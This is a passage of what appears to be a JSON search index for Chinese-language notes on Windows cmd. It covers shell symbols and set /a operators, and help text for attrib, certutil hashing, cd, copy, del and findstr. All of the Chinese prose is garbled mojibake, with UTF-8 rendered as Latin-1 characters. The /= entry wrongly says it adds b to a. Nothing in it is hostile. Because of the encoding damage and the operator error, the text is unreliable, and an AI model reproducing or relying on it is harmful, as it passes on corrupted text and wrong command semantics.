åœ¨set/aä¸­è¡¨ç¤ºç®—æœ¯è¿ç®—ï¼Œæ¯”å¦‚\"set /a x=5-6*5\"ã€‚ \\ \\ â‘  è¿™ä¸ª\"\\\"ç¬¦å·åœ¨æœ‰çš„æƒ…å†µä¸‹ï¼Œä»£è¡¨çš„æ˜¯å½“å‰è·¯å¾„çš„æ ¹ç›®å½•.æ¯”å¦‚å½“å‰ç›®å½•åœ¨c:\\windows\\system32ä¸‹ï¼Œé‚£ä¹ˆä½ \"dir \\\"çš„è¯ï¼Œå°±ç›¸å½“ä¸\"dir c:\\\"ã€‚ â‘¡ åœ¨findstr/rä¸­è¡¨ç¤ºæ­£åˆ™è½¬ä¹‰å­—ç¬¦ã€‚ , , â‘  åœ¨set /aä¸­è¡¨ç¤ºè¿ç»­è¡¨è¾¾å¼çš„åˆ†å‰²ç¬¦ã€‚ â‘¡ åœ¨æŸäº›å‘½ä»¤ä¸­åˆ†å‰²å…ƒç´ ã€‚ . . â‘  åœ¨è·¯å¾„çš„\\åç´§è·Ÿæˆ–è€…å•ç‹¬å‡ºç°æ—¶ï¼š ä¸€ä¸ª.è¡¨ç¤ºå½“å‰ç›®å½•ã€‚ ä¸¤ä¸ª.è¡¨ç¤ºä¸Šä¸€çº§ç›®å½•ã€‚ â‘¡ åœ¨è·¯å¾„ä¸­çš„æ–‡ä»¶åä¸­å‡ºç°æ—¶ï¼š æœ€åçš„ä¸€ä¸ª.è¡¨ç¤ºä¸»æ–‡ä»¶åä¸æ‰©å±•æ–‡ä»¶åçš„åˆ†éš”ã€‚ ? ? â‘  åœ¨findstr/rä¸­è¡¨ç¤ºåœ¨æ­¤ä½ç½®åŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦ã€‚ â‘¡ åœ¨è·¯å¾„ä¸­è¡¨ç¤ºåœ¨æ­¤ä½ç½®é€šé…ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ â‘¢ ç´§è·Ÿåœ¨/åè¡¨ç¤ºè·å–å‘½ä»¤çš„å¸®åŠ©æ–‡æ¡£ã€‚ å¤šç¬¦å·(ç¬¦å·ä¸èƒ½åˆ†éš”) && && â‘  è¿æ¥ä¸¤ä¸ªå‘½ä»¤ï¼Œå½“&&å‰çš„å‘½ä»¤æˆåŠŸæ—¶ï¼Œæ‰æ‰§è¡Œ&&åçš„å‘½ä»¤ã€‚ || || â‘  è¿æ¥ä¸¤ä¸ªå‘½ä»¤ï¼Œå½“||å‰çš„å‘½ä»¤å¤±è´¥æ—¶ï¼Œæ‰æ‰§è¡Œ||åçš„å‘½ä»¤ã€‚ >& >& â‘  å°†ä¸€ä¸ªå¥æŸ„çš„è¾“å‡ºå†™å…¥åˆ°å¦ä¸€ä¸ªå¥æŸ„çš„è¾“å…¥ä¸­ã€‚ <& <& â‘  ä»ä¸€ä¸ªå¥æŸ„è¯»å–è¾“å…¥å¹¶å°†å…¶å†™å…¥åˆ°å¦ä¸€ä¸ªå¥æŸ„è¾“å‡ºä¸­ã€‚ %% %% â‘  ä¸¤ä¸ªè¿ç»­çš„%è¡¨ç¤ºåœ¨é¢„å¤„ç†ä¸­è„±ä¸ºä¸€ä¸ª%ã€‚ â‘¡ æ‰¹å¤„ç†ä¸­ï¼Œåœ¨forè¯­å¥çš„inå­å¥ä¹‹å‰ï¼Œè¿ç»­ä¸¤ä¸ª%ç´§è·Ÿä¸€ä¸ªå­—ç¬¦ï¼ˆå¯ä»¥æ˜¯å­—æ¯ã€æ•°å­—å’Œä¸€äº›ç‰¹å®šå­—ç¬¦ï¼‰ï¼Œè¡¨ç¤ºæŒ‡å®šä¸€ä¸ªå¾ªç¯æˆ–è€…éå†æŒ‡æ ‡å˜é‡ã€‚ â‘¢ æ‰¹å¤„ç†ä¸­ï¼Œåœ¨forè¯­å¥ä¸­ï¼Œä½¿ç”¨ä¸inä¹‹å‰æŒ‡å®šçš„æŒ‡æ ‡å˜é‡ç›¸åŒçš„ä¸²ï¼Œè¡¨ç¤ºå¼•ç”¨è¿™ä¸ªæŒ‡æ ‡å˜é‡ã€‚ >> >> â‘  å‘½ä»¤é‡å®šå‘ç¬¦ï¼Œå°†å…¶å‰é¢çš„å‘½ä»¤çš„è¾“å‡ºç»“æœè¿½åŠ åˆ°å…¶åé¢çš„è®¾å¤‡ä¸­å»ã€‚ â‘¡ åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œè¡¨ç¤ºé€»è¾‘å³ç§»ã€‚ == == â‘  ==åœ¨ifå‘½ä»¤ä¸­åˆ¤æ–­==ä¸¤è¾¹çš„å…ƒç´ æ˜¯å¦ç›¸åŒã€‚ << << â‘  åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œè¡¨ç¤ºé€»è¾‘å·¦ç§»ã€‚ += += â‘  åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚ä¾‹å¦‚set /a a+=bè¡¨ç¤ºå°†aåŠ ä¸Šbçš„ç»“æœèµ‹å€¼ç»™aã€‚ -= -= â‘  åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚ä¾‹å¦‚set /a a-=bè¡¨ç¤ºå°†aå‡å»bçš„ç»“æœèµ‹å€¼ç»™aã€‚ *= *= â‘  *= åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚ä¾‹å¦‚set /a a*=bè¡¨ç¤ºå°†aä¹˜ä»¥bçš„ç»“æœèµ‹å€¼ç»™aã€‚ /= /= â‘  /= åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚ä¾‹å¦‚set /a a/=bè¡¨ç¤ºå°†aåŠ ä¸Šbçš„ç»“æœèµ‹å€¼ç»™aã€‚ %= %= â‘  %=åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚ä¾‹å¦‚set /a a%=bè¡¨ç¤ºå°†aé™¤ä»¥bçš„ä½™æ•°èµ‹å€¼ç»™aã€‚ ã€æ³¨ï¼šå‘½ä»¤è¡Œå¯ä»¥ç›´æ¥ç”¨ set /a a%=b ï¼Œåœ¨æ‰¹å¤„ç†é‡Œé¢å¯ä»¥ç”¨ set /a a%%=b ã€‚ã€‘ &#94;= &#94;= â‘  åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚ä¾‹å¦‚set /a a\"&#94;=\"bè¡¨ç¤ºå°†aä¸bæŒ‰ä½å¼‚çš„ç»“æœèµ‹å€¼ç»™aã€‚ ã€æ³¨ï¼šè¿™é‡Œ \"&#94;=\" åŠ å¼•å·æ˜¯ä¸ºäº†é˜²æ­¢&#94;è¢«è½¬ä¹‰ï¼Œä¸‹åŒã€‚ã€‘ &= &= â‘  åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚ä¾‹å¦‚set /a a\"&=\"bè¡¨ç¤ºå°†aä¸bæŒ‰ä½ä¸çš„ç»“æœèµ‹å€¼ç»™aã€‚ |= |= â‘  åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚ä¾‹å¦‚set /a a\"|=\"bè¡¨ç¤ºå°†aä¸bæŒ‰ä½æˆ–çš„ç»“æœèµ‹å€¼ç»™aã€‚ <<= <<= â‘  åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚ä¾‹å¦‚set /a a\"<<=\"bè¡¨ç¤ºå°†aæŒ‰ä½å·¦ç§»bä½çš„ç»“æœèµ‹å€¼ç»™aã€‚ >>= >>= â‘  åœ¨set /aä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚ä¾‹å¦‚set /a a\">>=\"bè¡¨ç¤ºå°†aæŒ‰ä½å³ç§»bä½çš„ç»“æœèµ‹å€¼ç»™aã€‚ \\< \\< â‘  \\< åœ¨findstrçš„ä¸€èˆ¬è¡¨è¾¾å¼ä¸­è¡¨ç¤ºå­—çš„å¼€å§‹å¤„ã€‚ \\> \\> â‘  \\> åœ¨findstrçš„ä¸€èˆ¬è¡¨è¾¾å¼ä¸­è¡¨ç¤ºå­—çš„ç»“æŸå¤„ã€‚ åŒç¬¦å·å¯¹(ä¸¤ä¸ªç¬¦å·ä¹‹é—´é¡»æŒ‡å®šå­—ç¬¦ä¸²) ! ! ! ! â‘  ! ! å½“å¯ç”¨å˜é‡å»¶è¿Ÿæ—¶ï¼Œä½¿ç”¨!!å°†å˜é‡åæ‰©èµ·æ¥è¡¨ç¤ºå¯¹å˜é‡å€¼çš„å¼•ç”¨ã€‚ ' ' ' ' â‘  åœ¨for/fä¸­è¡¨ç¤ºå°†å®ƒä»¬åŒ…å«çš„å†…å®¹å½“ä½œå‘½ä»¤è¡Œæ‰§è¡Œå¹¶åˆ†æå…¶è¾“å‡ºã€‚ â‘¡ åœ¨for/f \"usebackq\"ä¸­è¡¨ç¤ºå°†å®ƒä»¬åŒ…å«çš„å­—ç¬¦ä¸²å½“ä½œå­—ç¬¦ä¸²åˆ†æã€‚ ( ) ( ) â‘  å‘½ä»¤åŒ…å«æˆ–è€…æ˜¯å…·æœ‰ä¼˜å…ˆæƒçš„ç•Œå®šç¬¦ï¼Œæ¯”å¦‚forå‘½ä»¤è¦ç”¨åˆ°è¿™ä¸ª()ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åœ¨ifï¼Œechoç­‰å‘½ä»¤ä¸­è§åˆ°å®ƒçš„èº«å½±ã€‚ â‘¡ åœ¨set /aä¸­è¡¨ç¤ºè¡¨è¾¾å¼åˆ†ç»„ã€‚ \" \" \" \" â‘  ç•Œå®šç¬¦ï¼Œåœ¨è¡¨ç¤ºå¸¦æœ‰ç©ºæ ¼çš„è·¯å¾„æ—¶å¸¸è¦ç”¨\"\"æ¥å°†è·¯å¾„æ‹¬èµ·æ¥ï¼Œåœ¨ä¸€äº›å‘½ä»¤é‡Œé¢ä¹Ÿéœ€è¦\" \"ç¬¦å·ã€‚ â‘¡ åœ¨for/fä¸­å°†è¡¨ç¤ºå®ƒä»¬åŒ…å«çš„å†…å®¹å½“ä½œå­—ç¬¦ä¸²åˆ†æã€‚ â‘¢ åœ¨for/f \"usebackq\"è¡¨ç¤ºå®ƒä»¬åŒ…å«çš„å†…å®¹å½“ä½œæ–‡ä»¶è·¯å¾„å¹¶åˆ†æå…¶æ–‡ä»¶çš„å†…å®¹ã€‚ â‘£ åœ¨å…¶å®ƒæƒ…å†µä¸‹è¡¨ç¤ºå…¶ä¸­çš„å†…å®¹æ˜¯ä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²ï¼Œå…¶ä¸­çš„>ã€>>ã€<ã€&ã€|ã€ç©ºæ ¼ç­‰ä¸å†è½¬ä¹‰ã€‚ ` ` ` ` â‘  åœ¨for/fä¸­è¡¨ç¤ºå®ƒä»¬æ‰€åŒ…å«çš„å†…å®¹å½“ä½œå‘½ä»¤è¡Œæ‰§è¡Œå¹¶åˆ†æå®ƒçš„è¾“å‡ºã€‚ % % % % â‘  ä½¿ç”¨ä¸¤ä¸ªå•ç‹¬çš„%åŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²è¡¨ç¤ºå¼•ç”¨ä»¥æ­¤ä¸²ä¸ºåçš„ç¯å¢ƒå˜é‡ã€‚æ¯”å¦‚ä¸€ä¸ª%time%å¯ä»¥æ‰©å±•åˆ°å½“å‰çš„ç³»ç»Ÿæ—¶é—´ã€‚ [ ] [ ] â‘  åœ¨å¸®åŠ©æ–‡æ¡£è¡¨ç¤ºå…¶ä¸­çš„å¼€å…³ã€é€‰é¡¹æˆ–å‚æ•°æ˜¯å¯é€‰çš„ã€‚ â‘¡ åœ¨findstr /rä¸­è¡¨ç¤ºæŒ‰å…¶ä¸­æŒ‡å®šçš„å­—ç¬¦é›†åŒ¹é…ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows_shell-symbol.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows_shell-symbol.html"},{"title":"attrib","text":"æ˜¾ç¤ºæˆ–æ›´æ”¹æ–‡ä»¶å±æ€§: ATTRIB [+R | -R] [+A | -A] [+S | -S] [+H | -H] [+O | -O] [+I | -I] [+X | -X] [+P | -P] [+U | -U] [drive:][path][filename] [/S [/D]] [/L] é€‰é¡¹/å‚æ•°è¯´æ˜: + è®¾ç½®å±æ€§ã€‚ - æ¸…é™¤å±æ€§ã€‚ R åªè¯»æ–‡ä»¶å±æ€§ã€‚ A å­˜æ¡£æ–‡ä»¶å±æ€§ã€‚ S ç³»ç»Ÿæ–‡ä»¶å±æ€§ã€‚ H éšè—æ–‡ä»¶å±æ€§ã€‚ O è„±æœºå±æ€§ã€‚ I æ— å†…å®¹ç´¢å¼•æ–‡ä»¶å±æ€§ã€‚ X æ— æ¸…ç†æ–‡ä»¶å±æ€§ã€‚ V å®Œæ•´æ€§å±æ€§ã€‚ P å›ºå®šå±æ€§ã€‚ U éå›ºå®šå±æ€§ã€‚ [drive:][path][filename] æŒ‡å®šå±æ€§è¦å¤„ç†çš„æ–‡ä»¶ã€‚ /S å¤„ç†å½“å‰æ–‡ä»¶å¤¹åŠå…¶æ‰€æœ‰å­æ–‡ä»¶å¤¹ä¸­ çš„åŒ¹é…æ–‡ä»¶ã€‚ /D ä¹Ÿå¤„ç†æ–‡ä»¶å¤¹ã€‚ /L å¤„ç†ç¬¦å·é“¾æ¥å’Œ ç¬¦å·é“¾æ¥ç›®æ ‡çš„å±æ€§ ä¾‹: md autorun attrib +a +s +h autorun ä¸Šé¢çš„å‘½ä»¤å°†å»ºç«‹æ–‡ä»¶å¤¹autorunï¼Œç„¶åå°†å…¶è®¾ä¸ºå­˜æ¡£ã€ç³»ç»Ÿã€éšè—å±æ€§","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Attrib.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Attrib.html"},{"title":"certutil","text":"windowsä¸‹ æŸ¥çœ‹æ–‡ä»¶ MD5 SHA1 SHA256 certutil -hashfile filename MD5 certutil -hashfile filename SHA1 certutil -hashfile filename SHA256","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-CertUtil.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-CertUtil.html"},{"title":"cd","text":"æ˜¾ç¤ºå½“å‰ç›®å½•åæˆ–æ”¹å˜å½“å‰ç›®å½•: CHDIR [/D] [drive:][path] CHDIR [..] CD [/D] [drive:][path] CD [..] .. æŒ‡å®šè¦æ”¹æˆçˆ¶ç›®å½•ã€‚ é”®å…¥ CD drive: æ˜¾ç¤ºæŒ‡å®šé©±åŠ¨å™¨ä¸­çš„å½“å‰ç›®å½•ã€‚ ä¸å¸¦å‚æ•°åªé”®å…¥ CDï¼Œåˆ™æ˜¾ç¤ºå½“å‰é©±åŠ¨å™¨å’Œç›®å½•ã€‚ ä½¿ç”¨ /D å¼€å…³ï¼Œé™¤äº†æ”¹å˜é©±åŠ¨å™¨çš„å½“å‰ç›®å½•ä¹‹å¤–ï¼Œè¿˜å¯æ”¹å˜å½“å‰é©±åŠ¨å™¨ã€‚ å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼ŒCHDIR ä¼šå¦‚ä¸‹æ”¹å˜: å½“å‰çš„ç›®å½•å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆä½¿ç”¨ç£ç›˜åä¸Šçš„å¤§å°å†™ã€‚ æ‰€ä»¥ï¼Œå¦‚æœç£ç›˜ä¸Šçš„å¤§å°å†™å¦‚æ­¤ï¼Œ CD C:\\TEMP ä¼šå°†å½“å‰ç›®å½•è®¾ä¸º C:\\Temp CHDIR å‘½ä»¤ä¸æŠŠç©ºæ ¼å½“ä½œåˆ†éš”ç¬¦ï¼Œå› æ­¤æœ‰å¯èƒ½å°†ç›®å½•åæ”¹ä¸ºä¸€ä¸ª å¸¦æœ‰ç©ºæ ¼ä½†ä¸å¸¦æœ‰å¼•å·çš„å­ç›®å½•åã€‚ä¾‹å¦‚: cd \\winnt\\profiles\\username\\programs\\start menu ä¸ä¸‹åˆ—ç›¸åŒ: cd \"\\winnt\\profiles\\username\\programs\\start menu\" åœ¨æ‰©å±•åœç”¨çš„æƒ…å†µä¸‹ï¼Œä½ å¿…é¡»é”®å…¥ä»¥ä¸Šå‘½ä»¤ã€‚ ç‰¹åˆ«è¯´æ˜-æ›´æ–°é©±åŠ¨å™¨ ä¸€èˆ¬è€Œè¨€, ç›´æ¥ä½¿ç”¨ cd å‘½ä»¤æ—¶, ä¸èƒ½æ›´æ”¹é©±åŠ¨å™¨, åªæœ‰åŠ  /d é€‰é¡¹æ—¶, æ‰æ”¯æŒæ›´æ”¹é©±åŠ¨å™¨. å¦‚: ; æ— æ•ˆ C:\\Users>cd \"D:\\Program Files\" ; æœ‰æ•ˆ C:\\Users>cd /d \"D:\\Program Files\" D:\\Program Files>","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Chengdu.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Chengdu.html"},{"title":"copy","text":"å°†ä¸€ä»½æˆ–å¤šä»½æ–‡ä»¶å¤åˆ¶åˆ°å¦ä¸€ä¸ªä½ç½®: COPY [/D] [/V] [/N] [/Y | /-Y] [/Z] [/L] [/A | /B ] source [/A | /B] [+ source [/A | /B] [+ ...]] [destination [/A | /B]] source æŒ‡å®šè¦å¤åˆ¶çš„æ–‡ä»¶ã€‚ /A è¡¨ç¤ºä¸€ä¸ª ASCII æ–‡æœ¬æ–‡ä»¶ã€‚ /B è¡¨ç¤ºä¸€ä¸ªäºŒè¿›ä½æ–‡ä»¶ã€‚ /D å…è®¸è§£å¯†è¦åˆ›å»ºçš„ç›®æ ‡æ–‡ä»¶ destination ä¸ºæ–°æ–‡ä»¶æŒ‡å®šç›®å½•å’Œ/æˆ–æ–‡ä»¶åã€‚ /V éªŒè¯æ–°æ–‡ä»¶å†™å…¥æ˜¯å¦æ­£ç¡®ã€‚ /N å¤åˆ¶å¸¦æœ‰é 8dot3 åç§°çš„æ–‡ä»¶æ—¶ï¼Œ å°½å¯èƒ½ä½¿ç”¨çŸ­æ–‡ä»¶åã€‚ /Y ä¸ä½¿ç”¨ç¡®è®¤æ˜¯å¦è¦è¦†ç›–ç°æœ‰ç›®æ ‡æ–‡ä»¶ çš„æç¤ºã€‚ /-Y ä½¿ç”¨ç¡®è®¤æ˜¯å¦è¦è¦†ç›–ç°æœ‰ç›®æ ‡æ–‡ä»¶ çš„æç¤ºã€‚ /Z ç”¨å¯é‡æ–°å¯åŠ¨æ¨¡å¼å¤åˆ¶å·²è”ç½‘çš„æ–‡ä»¶ã€‚ /L å¦‚æœæºæ˜¯ç¬¦å·é“¾æ¥ï¼Œè¯·å°†é“¾æ¥å¤åˆ¶ åˆ°ç›®æ ‡è€Œä¸æ˜¯æºé“¾æ¥æŒ‡å‘çš„å®é™…æ–‡ä»¶ã€‚ å‘½ä»¤è¡Œå¼€å…³ /Y å¯ä»¥åœ¨ COPYCMD ç¯å¢ƒå˜é‡ä¸­é¢„å…ˆè®¾å®šã€‚ è¿™å¯èƒ½ä¼šè¢«å‘½ä»¤è¡Œä¸Šçš„ /-Y æ›¿ä»£ã€‚ é™¤é COPYå‘½ä»¤æ˜¯åœ¨ä¸€ä¸ªæ‰¹å¤„ç†è„šæœ¬ä¸­æ‰§è¡Œçš„ï¼Œé»˜è®¤å€¼åº”ä¸ºåœ¨è¦†ç›–æ—¶è¿›è¡Œæç¤ºã€‚ è¦é™„åŠ æ–‡ä»¶ï¼Œè¯·ä¸ºç›®æ ‡æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œä¸ºæºæŒ‡å®šæ•°ä¸ªæ–‡ä»¶(ç”¨é€šé…ç¬¦æˆ– file1+file2+file3 æ ¼å¼)ã€‚ ä¸xcopyçš„åŒºåˆ« /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/xcopy åœ¨Windowsçš„æ‰¹å¤„ç†è„šæœ¬ä¸­ï¼Œcopyå’Œxcopyå‘½ä»¤éƒ½å¯ä»¥ç”¨äºå¤åˆ¶æ–‡ä»¶å’Œç›®å½•ã€‚ä¸è¿‡å®ƒä»¬ä¹‹é—´è¿˜æ˜¯å­˜åœ¨ä¸€äº›å·®å¼‚çš„ã€‚ copyå‘½ä»¤æ˜¯ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„å¤åˆ¶å‘½ä»¤ï¼Œå®ƒåªèƒ½å¤åˆ¶å•ä¸ªæ–‡ä»¶ï¼Œä¸èƒ½å¤åˆ¶ç›®å½•ã€‚è¯­æ³•: copy source_file destination_file è¿™ä¸ªå‘½ä»¤ä¼šå°†æºæ–‡ä»¶æ‹·è´åˆ°æŒ‡å®šçš„ç›®æ ‡æ–‡ä»¶ä¸­ã€‚å¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œåˆ™ä¼šè¢«è¦†ç›–ã€‚ xcopyå‘½ä»¤åˆ™æ›´åŠ å¼ºå¤§ï¼Œä¸ä»…å¯ä»¥å¤åˆ¶å•ä¸ªæ–‡ä»¶ï¼Œè¿˜å¯ä»¥å¤åˆ¶æ•´ä¸ªç›®å½•æ ‘ã€‚è¯­æ³•: xcopy source [destination] [/options] å…¶ä¸­ï¼Œsourceè¡¨ç¤ºè¦å¤åˆ¶çš„æºæ–‡ä»¶æˆ–ç›®å½•ï¼›destinationè¡¨ç¤ºç›®æ ‡ç›®å½•ï¼› /optionsæ˜¯å¯é€‰çš„å‘½ä»¤è¡Œé€‰é¡¹ï¼Œå¯ä»¥è®¾ç½®ä¾‹å¦‚æ˜¯å¦å¤åˆ¶å­ç›®å½•ã€æ˜¯å¦è¦†ç›–ç°æœ‰æ–‡ä»¶ç­‰å‚æ•°ã€‚ ç›¸æ¯”ä¹‹ä¸‹ï¼Œxcopyå‘½ä»¤æ¯”copyå‘½ä»¤æ›´åŠ çµæ´»å’Œå¼ºå¤§ï¼Œå°¤å…¶æ˜¯åœ¨éœ€è¦å¤åˆ¶æ•´ä¸ªç›®å½•æ ‘æ—¶éå¸¸å®ç”¨ã€‚ ä½†ä¹Ÿå› ä¸ºåŠŸèƒ½è¾ƒå¤šï¼Œå‘½ä»¤è¯­æ³•ä¹Ÿæ›´åŠ å¤æ‚ï¼Œéœ€è¦æ³¨æ„å‘½ä»¤å‚æ•°çš„æ­£ç¡®ä½¿ç”¨ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Copy.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-Copy.html"},{"title":"del","text":"åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶: DEL [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names ERASE [/P] [/F] [/S] [/Q] [/A[[:]attributes]] names é€‰é¡¹: names æŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶æˆ–è€…ç›®å½•åˆ—è¡¨ã€‚ é€šé…ç¬¦å¯ç”¨æ¥åˆ é™¤å¤šä¸ªæ–‡ä»¶ã€‚ å¦‚æœæŒ‡å®šäº†ä¸€ä¸ªç›®å½•ï¼Œè¯¥ç›®å½•ä¸­çš„æ‰€ æœ‰æ–‡ä»¶éƒ½ä¼šè¢«åˆ é™¤ã€‚ /P åˆ é™¤æ¯ä¸€ä¸ªæ–‡ä»¶ä¹‹å‰æç¤ºç¡®è®¤ã€‚ /F å¼ºåˆ¶åˆ é™¤åªè¯»æ–‡ä»¶ã€‚ /S åˆ é™¤æ‰€æœ‰å­ç›®å½•ä¸­çš„æŒ‡å®šçš„æ–‡ä»¶ã€‚ /Q å®‰é™æ¨¡å¼ã€‚åˆ é™¤å…¨å±€é€šé…ç¬¦æ—¶ï¼Œä¸è¦æ±‚ç¡®è®¤ /A æ ¹æ®å±æ€§é€‰æ‹©è¦åˆ é™¤çš„æ–‡ä»¶ å±æ€§ R åªè¯»æ–‡ä»¶ S ç³»ç»Ÿæ–‡ä»¶ H éšè—æ–‡ä»¶ A å‡†å¤‡å­˜æ¡£çš„æ–‡ä»¶ I æ— å†…å®¹ç´¢å¼•æ–‡ä»¶ L é‡æ–°åˆ†æç‚¹ O è„±æœºæ–‡ä»¶ - è¡¨ç¤º\"å¦\"çš„å‰ç¼€ å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼ŒDEL å’Œ ERASE æ›´æ”¹å¦‚ä¸‹: /S å¼€å…³çš„æ˜¾ç¤ºå¥æ³•ä¼šé¢ å€’ï¼Œå³åªæ˜¾ç¤ºå·²ç»åˆ é™¤çš„æ–‡ä»¶ï¼Œè€Œä¸æ˜¾ç¤ºæ‰¾ä¸åˆ°çš„æ–‡ä»¶ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-DEL.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-DEL.html"},{"title":"findstr","text":"æœç´¢å­—ç¬¦ä¸², æƒ³æ‰¾ç±»ä¼¼ä¸linuxä¸‹ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/grep æ—¶æ‰¾åˆ°çš„: PS C:\\Users\\yanque> tasklist | findstr dllhost dllhost.exe 1416 Console 9 27,020 K dllhost.exe 19296 Console 9 17,220 K åœ¨æ–‡ä»¶ä¸­å¯»æ‰¾å­—ç¬¦ä¸², è¯­æ³•: FINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/P] [/F:file] [/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]] strings [[drive:][path]filename[ ...]] æ”¯æŒå‚æ•°è¯´æ˜: /B åœ¨ä¸€è¡Œçš„å¼€å§‹é…å¯¹æ¨¡å¼ã€‚ /E åœ¨ä¸€è¡Œçš„ç»“å°¾é…å¯¹æ¨¡å¼ã€‚ /L æŒ‰å­—ä½¿ç”¨æœç´¢å­—ç¬¦ä¸²ã€‚ /R å°†æœç´¢å­—ç¬¦ä¸²ä½œä¸ºä¸€èˆ¬è¡¨è¾¾å¼ä½¿ç”¨ã€‚ /S åœ¨å½“å‰ç›®å½•å’Œæ‰€æœ‰å­ç›®å½•ä¸­æœç´¢åŒ¹é…æ–‡ä»¶ã€‚ /I æŒ‡å®šæœç´¢ä¸åˆ†å¤§å°å†™ã€‚ /X æ‰“å°å®Œå…¨åŒ¹é…çš„è¡Œã€‚ /V åªæ‰“å°ä¸åŒ…å«åŒ¹é…çš„è¡Œã€‚ /N åœ¨åŒ¹é…çš„æ¯è¡Œå‰æ‰“å°è¡Œæ•°ã€‚ /M å¦‚æœæ–‡ä»¶å«æœ‰åŒ¹é…é¡¹ï¼Œåªæ‰“å°å…¶æ–‡ä»¶åã€‚ /O åœ¨æ¯ä¸ªåŒ¹é…è¡Œå‰æ‰“å°å­—ç¬¦åç§»é‡ã€‚ /P å¿½ç•¥æœ‰ä¸å¯æ‰“å°å­—ç¬¦çš„æ–‡ä»¶ã€‚ /OFF[LINE] ä¸è·³è¿‡å¸¦æœ‰è„±æœºå±æ€§é›†çš„æ–‡ä»¶ã€‚ /A:attr æŒ‡å®šæœ‰åå…­è¿›ä½æ•°å­—çš„é¢œè‰²å±æ€§ã€‚è¯·è§ \"color /?\" /F:file ä»æŒ‡å®šæ–‡ä»¶è¯»æ–‡ä»¶åˆ—è¡¨ (/ ä»£è¡¨æ§åˆ¶å°)ã€‚ /C:string ä½¿ç”¨æŒ‡å®šå­—ç¬¦ä¸²ä½œä¸ºæ–‡å­—æœç´¢å­—ç¬¦ä¸²ã€‚ /G:file ä»æŒ‡å®šçš„æ–‡ä»¶è·å¾—æœç´¢å­—ç¬¦ä¸²ã€‚ (/ ä»£è¡¨æ§åˆ¶å°)ã€‚ /D:dir æŸ¥æ‰¾ä»¥åˆ†å·ä¸ºåˆ†éš”ç¬¦çš„ç›®å½•åˆ—è¡¨ strings è¦æŸ¥æ‰¾çš„æ–‡å­—ã€‚ [drive:][path]filename æŒ‡å®šè¦æŸ¥æ‰¾çš„æ–‡ä»¶ã€‚ é™¤éå‚æ•°æœ‰ /C å‰ç¼€ï¼Œè¯·ä½¿ç”¨ç©ºæ ¼éš”å¼€æœç´¢å­—ç¬¦ä¸²ã€‚ ä¾‹å¦‚, åœ¨æ–‡ä»¶ x.y ä¸­å¯»æ‰¾ \"hello\" æˆ– \"there\" FINDSTR \"hello there\" x.y æ–‡ä»¶ x.y å¯»æ‰¾\"hello there\" FINDSTR /C:\"hello there\" x.y ä¸€èˆ¬è¡¨è¾¾å¼çš„å¿«é€Ÿå‚è€ƒ: . é€šé…ç¬¦: ä»»ä½•å­—ç¬¦ * é‡å¤: ä»¥å‰å­—ç¬¦æˆ–ç±»å‡ºç°é›¶æˆ–é›¶ä»¥ä¸Šæ¬¡æ•° &#94; è¡Œä½ç½®: è¡Œçš„å¼€å§‹ $ è¡Œä½ç½®: è¡Œçš„ç»ˆç‚¹ [class] å­—ç¬¦ç±»: ä»»ä½•åœ¨å­—ç¬¦é›†ä¸­çš„å­—ç¬¦ [&#94;class] è¡¥å­—ç¬¦ç±»: ä»»ä½•ä¸åœ¨å­—ç¬¦é›†ä¸­çš„å­—ç¬¦ [x-y] èŒƒå›´: åœ¨æŒ‡å®šèŒƒå›´å†…çš„ä»»ä½•å­—ç¬¦ /x Escape: å…ƒå­—ç¬¦ x çš„æ–‡å­—ç”¨æ³• 